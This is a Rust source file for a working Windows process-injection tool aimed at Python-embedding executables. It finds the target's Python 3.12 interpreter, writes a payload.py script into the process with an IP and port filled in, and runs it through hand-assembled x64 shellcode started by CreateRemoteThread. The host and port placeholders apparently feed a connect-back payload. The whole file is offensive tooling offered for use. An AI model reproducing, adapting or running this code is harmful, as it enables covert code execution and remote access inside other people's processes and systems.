use std::ffi::c_void;
use std::mem;
use windows::Win32::Foundation::{HANDLE, FALSE, CloseHandle};
use windows::Win32::System::Memory::{
    VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
    PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD,
    PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS};
use anyhow::{anyhow, Result, Context};
use clap::Parser;
use log::{debug, info, LevelFilter};
use windows::core::Error;
use py_spy::python_process_info::{PythonProcessInfo, get_interpreter_address, get_python_version};
use remoteprocess::Process;
use remoteprocess::ProcessMemory;
use std::fs;
use std::path::Path;
use std::env;



mod v3_12_0;
use crate::v3_12_0::{
    pyruntimestate,
    _is as PyInterpreterState,
    PyThreadState,
};

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Process ID or name (default: "exefile.exe")
    #[arg(short, long, default_value = "exefile.exe")]
    target: String,

    /// IP address to connect to (default: "127.0.0.1")
    #[arg(long, default_value = "127.0.0.1")]
    ip: String,

    /// Port number to connect to (default: 1337)
    #[arg(long, default_value_t = 1337)]
    port: u16,
}

fn find_process_id(target: &str) -> Result<u32> {
    // If target is a number, parse it as PID
    if let Ok(pid) = target.parse::<u32>() {
        return Ok(pid);
    }

    // Otherwise, search for process by name using Toolhelp32Snapshot
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) }
        .map_err(|e| anyhow!("Failed to create process snapshot: {}", e))?;

    // Ensure we close the snapshot handle when we're done
    struct SnapshotHandle(HANDLE);
    impl Drop for SnapshotHandle {
        fn drop(&mut self) {
            unsafe { 
                if let Err(e) = CloseHandle(self.0) {
                    debug!("Failed to close snapshot handle: {}", e);
                }
            }
        }
    }
    let _snapshot_handle = SnapshotHandle(snapshot);
    
    let mut entry = PROCESSENTRY32W {
        dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
        ..Default::default()
    };

    // Get first process
    unsafe {
        // Get first process
        if let Err(e) = Process32FirstW(snapshot, &mut entry) {
            return Err(anyhow!("Failed to get first process: {}", e));
        }

        loop {
            let process_name = String::from_utf16_lossy(&entry.szExeFile[..entry.szExeFile.iter().position(|&x| x == 0).unwrap_or(entry.szExeFile.len())]);
            debug!("Found process: {} (PID: {})", process_name, entry.th32ProcessID);
            
            if process_name.eq_ignore_ascii_case(target) {
                return Ok(entry.th32ProcessID);
            }

            // Try to get next process, break if no more processes
            if let Err(_) = Process32NextW(snapshot, &mut entry) {
                break;
            }
        }
    }

    Err(anyhow!("No process found matching '{}'", target))
}

fn read_payload_file(ip: &str, port: u16) -> Result<String> {
    // Try current directory and up to 3 parent directories
    let mut current_path = std::env::current_dir()
        .map_err(|e| anyhow!("Failed to get current directory: {}", e))?;
    
    let payload_paths = std::iter::once(current_path.clone())
        .chain((0..3).map(|_| {
            current_path = current_path.parent()
                .map(Path::to_path_buf)
                .unwrap_or_else(|| current_path.clone());
            current_path.clone()
        }));

    for dir in payload_paths {
        let payload_path = dir.join("payload.py");
        debug!("Looking for payload at: {:?}", payload_path);
        
        if let Ok(mut payload) = fs::read_to_string(&payload_path) {
            info!("Found payload at: {:?}", payload_path);
            // Replace placeholders with actual values
            payload = payload.replace("__HOST__", ip);
            payload = payload.replace("__PORT__", &port.to_string());
            return Ok(payload);
        }
    }

    Err(anyhow!("payload.py not found in current directory or up to 3 parent directories"))
}

fn allocate_memory(process_handle: HANDLE, size: usize) -> Result<*mut c_void> {
    let addr = unsafe {
        VirtualAllocEx(
            process_handle,
            None,
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if addr.is_null() {
        return Err(Error::from_win32().into());
    }

    Ok(addr)
}

fn write_memory(
    process_handle: HANDLE,
    addr: *mut c_void,
    data: &[u8],
) -> Result<()> {
    let mut bytes_written = 0;
    unsafe {
        WriteProcessMemory(
            process_handle,
            addr,
            data.as_ptr() as *const c_void,
            data.len(),
            Some(&mut bytes_written),
        ).map_err(|e| anyhow!("Failed to write memory: {}", e))?;
    }

    if bytes_written != data.len() {
        return Err(anyhow!("Failed to write all bytes to target process"));
    }

    Ok(())
}

fn protect_memory(
    process_handle: HANDLE,
    addr: *mut c_void,
    size: usize,
    protection: PAGE_PROTECTION_FLAGS,
) -> Result<()> {
    let mut old_protection = PAGE_PROTECTION_FLAGS(0);
    unsafe {
        VirtualProtectEx(
            process_handle,
            addr,
            size,
            protection,
            &mut old_protection,
        ).map_err(|e| anyhow!("Failed to protect memory: {}", e))?;
    }

    Ok(())
}

// fn deallocate_memory(process_handle: HANDLE, addr: *mut c_void) -> Result<()> {
//     unsafe { 
//         VirtualFreeEx(process_handle, addr, 0, MEM_RELEASE)
//             .map_err(|e| anyhow!("Failed to deallocate memory: {}", e))?;
//     }

//     Ok(())
// }

// x64 assembly shellcode to call PyGILState_Ensure, PyRun_SimpleStringFlags, and PyGILState_Release
const SHELLCODE: [u8; 55] = [
    // PyGILState_Ensure()
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, PyGILState_Ensure
    0xFF, 0xD0,                                                    // call rax
    0x50,                                                         // push rax (save gilstate)
    
    // PyRun_SimpleStringFlags(payload, NULL)
    0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rcx, payload_addr
    0x48, 0x31, 0xD2,                                              // xor rdx, rdx
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, PyRun_SimpleStringFlags
    0xFF, 0xD0,                                                    // call rax
    
    // PyGILState_Release(gilstate)
    0x58,                                                         // pop rax (restore gilstate)
    0x48, 0x89, 0xC1,                                            // mov rcx, rax
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, PyGILState_Release
    0xFF, 0xD0,                                                    // call rax
    
    0xC3,                                                          // ret
];

fn inject_payload(process_handle: HANDLE, payload: &str, python_info: &PythonProcessInfo) -> Result<()> {
    let payload_bytes = payload.as_bytes();
    let payload_size = payload_bytes.len();

    // Allocate memory for payload string
    let payload_addr = allocate_memory(process_handle, payload_size + 1)?;
    write_memory(process_handle, payload_addr, payload_bytes)?;
    
    // Write null terminator
    let null_terminator = [0u8];
    write_memory(
        process_handle, 
        unsafe { payload_addr.add(payload_size) }, 
        &null_terminator
    )?;

    // Get function addresses
    let pygilstate_ensure = python_info.get_symbol("PyGILState_Ensure")
        .map(|&addr| addr as usize)
        .ok_or_else(|| anyhow!("Failed to find PyGILState_Ensure symbol"))?;

    let pyrun_addr = python_info.get_symbol("PyRun_SimpleStringFlags")
        .map(|&addr| addr as usize)
        .ok_or_else(|| anyhow!("Failed to find PyRun_SimpleStringFlags symbol"))?;

    let pygilstate_release = python_info.get_symbol("PyGILState_Release")
        .map(|&addr| addr as usize)
        .ok_or_else(|| anyhow!("Failed to find PyGILState_Release symbol"))?;

    // Create shellcode with the correct addresses
    let mut shellcode = SHELLCODE.to_vec();
    
    // PyGILState_Ensure address
    shellcode[2..10].copy_from_slice(&pygilstate_ensure.to_le_bytes());
    
    // Payload address for PyRun_SimpleStringFlags
    shellcode[15..23].copy_from_slice(&(payload_addr as usize).to_le_bytes());
    
    // PyRun_SimpleStringFlags address
    shellcode[28..36].copy_from_slice(&pyrun_addr.to_le_bytes());
    
    // PyGILState_Release address
    shellcode[47..55].copy_from_slice(&pygilstate_release.to_le_bytes());

    // Allocate memory for shellcode
    let shellcode_addr = allocate_memory(process_handle, shellcode.len())?;
    write_memory(process_handle, shellcode_addr, &shellcode)?;
    protect_memory(process_handle, shellcode_addr, shellcode.len(), PAGE_EXECUTE_READ)?;

    // Create remote thread to execute shellcode
    let mut thread_id = 0;
    let thread_handle = unsafe {
        CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(mem::transmute(shellcode_addr)),
            None,
            0,
            Some(&mut thread_id),
        )
    }.map_err(|e| anyhow!("Failed to create remote thread: {}", e))?;

    if thread_handle.is_invalid() {
        return Err(anyhow!("Failed to create remote thread: invalid handle"));
    }

    Ok(())
}

fn main() -> Result<()> {
    // Initialize logging with INFO as default unless RUST_LOG is set
    if env::var("RUST_LOG").is_err() {
        env_logger::Builder::new()
            .filter_level(LevelFilter::Info)
            .init();
    } else {
        env_logger::init();
    }

    let args = Args::parse();

    let target_pid = find_process_id(&args.target)?;
    info!("Found process {} with PID {}", args.target, target_pid);
    
    let process = Process::new(target_pid.try_into()?)?;
    let python_info = PythonProcessInfo::new(&process)?;
    info!("PythonProcessInfo.python_filename: {:?}", python_info.python_filename);
    let version = get_python_version(&python_info, &process)?;
    let interpreter_address = get_interpreter_address(&python_info, &process, &version)?;
    info!("Found Python {} interpreter at 0x{:x}", version, interpreter_address);
    
    let interp: PyInterpreterState = process
    .copy_struct(interpreter_address)
    .context("Failed to copy PyInterpreterState from process")?;

    debug!("Interpreter state id: {}", interp.id);
    debug!("Interpreter state runtime: {:?}", interp.runtime);

    // Read runtime state
    let runtime: pyruntimestate = process
    .copy_struct(interp.runtime as usize)
    .context("Failed to read PyRuntimeState")?;

    debug!("Runtime initialized: {:?}", runtime.initialized);
    if runtime.interpreters.head == interpreter_address as *mut PyInterpreterState {
        info!("Interpreter validated");
    } else {
        info!("Fail");
    }

    // Collect all interpreters
    let mut interpreters = Vec::new();
    let mut current_interp_ptr = runtime.interpreters.head;

    while !current_interp_ptr.is_null() {
        let current_interp: PyInterpreterState = process
            .copy_struct(current_interp_ptr as usize)
            .context("Failed to copy PyInterpreterState from linked list")?;

        debug!("Found interpreter with id: {}", current_interp.id);
        interpreters.push(current_interp);

        current_interp_ptr = current_interp.next;
    }

    info!("Found {} interpreters", interpreters.len());
    for (i, interp) in interpreters.iter().enumerate() {
    info!("Interpreter {}: id={}, initialized={}", i, interp.id, interp._initialized);
    }

    // Get threads from main interpreter (first one)
    if let Some(main_interp) = interpreters.first() {
        let mut threads = Vec::new();
        let mut current_thread_ptr = main_interp.threads.head;

        while !current_thread_ptr.is_null() {
            let thread: PyThreadState = process
                .copy_struct(current_thread_ptr as usize)
                .context("Failed to copy PyThreadState from linked list")?;

            debug!("Found thread with id: {}", thread.thread_id);
            threads.push(thread);

            current_thread_ptr = thread.next;
        }

        info!("Found {} threads in main interpreter", threads.len());
        for (i, thread) in threads.iter().enumerate() {
            info!("Thread {}: id={}, native_id={:?}", i, thread.thread_id, thread.native_thread_id);
        }
    }

    let process_handle = unsafe {
        OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | 
            PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
            FALSE,
            target_pid,
        )
    }.map_err(|e| anyhow!("Failed to open process: {}", e))?;

    if process_handle.is_invalid() {
        return Err(anyhow!("Failed to open process: invalid handle"));
    }

    let payload = read_payload_file(&args.ip, args.port)?;
    inject_payload(process_handle, &payload, &python_info)?;

    info!("Successfully injected payload.");

    Ok(())
}


